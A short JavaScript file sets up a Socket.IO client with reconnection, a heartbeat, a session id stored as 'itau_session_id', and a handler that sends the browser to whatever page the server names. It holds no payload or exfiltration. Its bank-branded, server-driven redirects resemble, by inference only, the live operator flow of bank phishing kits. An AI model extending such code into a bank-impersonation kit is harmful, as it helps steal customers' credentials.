// Socket.IO Connection Handler with enhanced reconnection and heartbeat
(function() {
    'use strict';
    
    // Socket configuration with robust reconnection
    const socket = io({
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionDelayMax: 5000,
        reconnectionAttempts: Infinity,
        timeout: 20000,
        transports: ['websocket', 'polling'],
        upgrade: true,
        rememberUpgrade: true,
        autoConnect: true
    });

    let sessionId = localStorage.getItem('itau_session_id');
    let heartbeatInterval = null;
    let isConnected = false;

    // Start heartbeat to keep session alive
    function startHeartbeat() {
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
        }
        
        heartbeatInterval = setInterval(() => {
            if (isConnected && sessionId) {
                socket.emit('heartbeat');
            }
        }, 20000); // Every 20 seconds
    }

    // Stop heartbeat
    function stopHeartbeat() {
        if (heartbeatInterval) {
            clearInterval(heartbeatInterval);
            heartbeatInterval = null;
        }
    }

    // Initialize session on connection
    socket.on('connect', () => {
        console.log('Socket connected:', socket.id);
        isConnected = true;
        socket.emit('init-session', { sessionId });
    });

    socket.on('session-ready', (data) => {
        sessionId = data.sessionId;
        localStorage.setItem('itau_session_id', sessionId);
        console.log('Session ready:', sessionId, data.reconnected ? '(reconnected)' : '(new)');
        startHeartbeat();
    });

    socket.on('heartbeat-ack', () => {
        console.log('Heartbeat acknowledged');
    });

    socket.on('disconnect', (reason) => {
        console.log('Socket disconnected:', reason);
        isConnected = false;
        stopHeartbeat();
    });

    socket.on('connect_error', (error) => {
        console.error('Connection error:', error.message);
    });

    socket.on('reconnect', (attemptNumber) => {
        console.log('Reconnected after', attemptNumber, 'attempts');
    });

    socket.on('reconnect_attempt', (attemptNumber) => {
        console.log('Reconnection attempt:', attemptNumber);
    });

    socket.on('reconnect_error', (error) => {
        console.error('Reconnection error:', error.message);
    });

    socket.on('reconnect_failed', () => {
        console.error('Reconnection failed');
    });

    // Handle redirect commands
    socket.on('redirect', (data) => {
        console.log('Redirect received:', data);
        if (data.clearData) {
            // Clear session but keep connection
            localStorage.removeItem('itau_session_id');
            sessionId = null;
        }
        window.location.href = data.page;
    });

    // Clean up on page unload
    window.addEventListener('beforeunload', () => {
        stopHeartbeat();
    });

    // Expose socket and sessionId globally
    window.itauSocket = socket;
    window.getSessionId = () => sessionId;
    window.setSessionId = (id) => {
        sessionId = id;
        localStorage.setItem('itau_session_id', id);
    };
})();
